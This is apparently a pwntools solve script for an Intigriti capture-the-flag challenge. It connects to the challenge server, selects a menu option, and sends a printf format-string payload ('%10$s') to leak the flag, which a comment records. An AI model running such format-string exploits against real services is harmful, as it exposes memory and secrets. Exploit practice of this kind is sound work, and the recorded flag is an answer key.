#!/usr/bin/env python3
from pwn import *

# p = process("./floor")
p = remote("floormats.ctf.intigriti.io", 1337)
p.sendlineafter(b'choice:\n', '6') 
p.sendlineafter(b'address:\n', '%10$s')

p.interactive()
# INTIGRITI{50_7h475_why_7h3y_w4rn_4b0u7_pr1n7f}